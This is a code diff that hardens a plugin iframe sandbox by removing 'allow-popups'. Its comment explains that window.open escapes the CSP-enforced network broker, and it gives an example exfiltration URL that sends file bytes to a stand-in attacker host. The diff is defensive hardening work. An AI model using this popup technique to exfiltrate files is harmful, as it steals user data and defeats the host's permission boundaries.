@@ -39,7 +39,14 @@ export class FrameManager {
     const iframe = document.createElement('iframe');
     iframe.style.cssText = HIDDEN_STYLE;
     // Opaque-origin sandbox: scripts only, no same-origin, no top navigation.
-    iframe.setAttribute('sandbox', 'allow-scripts allow-forms allow-popups');
+    //
+    // Deliberately NO `allow-popups`. The CSP below blocks fetch/XHR/WebSocket/beacon
+    // so that all network access is brokered by the host against the plugin's declared
+    // endpoints — but no CSP directive covers `window.open`, so a popup is a hole
+    // straight through that broker: one real click and a plugin granted `files` but not
+    // `network` can navigate a new context to `https://attacker/?d=<file bytes>`.
+    // A plugin that genuinely needs to send the user somewhere asks the host to do it.
+    iframe.setAttribute('sandbox', 'allow-scripts allow-forms');
     iframe.setAttribute('referrerpolicy', 'no-referrer');
     // A frame can boot at a different ENTRY MODULE of the plugin's one module tree —
     // that's all an opener is. Same package, same shared code, different entry.
